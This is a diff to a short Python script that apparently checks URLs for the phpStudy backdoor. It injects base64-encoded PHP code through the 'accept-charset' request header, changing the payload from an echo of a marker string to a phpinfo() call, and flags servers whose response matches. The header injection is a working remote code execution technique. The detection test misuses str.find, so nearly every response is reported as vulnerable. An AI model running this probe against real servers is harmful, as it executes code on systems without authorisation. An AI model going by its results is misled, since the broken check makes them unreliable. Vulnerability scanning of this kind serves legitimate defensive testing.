@@ -20,14 +20,14 @@ def check(url):
         'Sec-Fetch-User': '?1',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
         'Sec-Fetch-Site': 'none',
-        'accept-charset': 'ZWNobyUyMHBocHN0dWR5Z2hvc3QlM0I=',
+        'accept-charset': 'cGhwaW5mbyUyOCUyOSUzQg==',
         'Accept-Encoding': 'gzip,deflate',
         'Accept-Language': 'zh-CN,zh;q=0.9',
     }
     try:
         res = rq.get(url, headers=headers, timeout=20)
         if res.status_code == 200:
-            if res.text.find('phpstudyghost'):
+            if res.text.find('PHP Version'):
                 print("[存在漏洞] " + url)
     except:
         print("[超时] " + url)
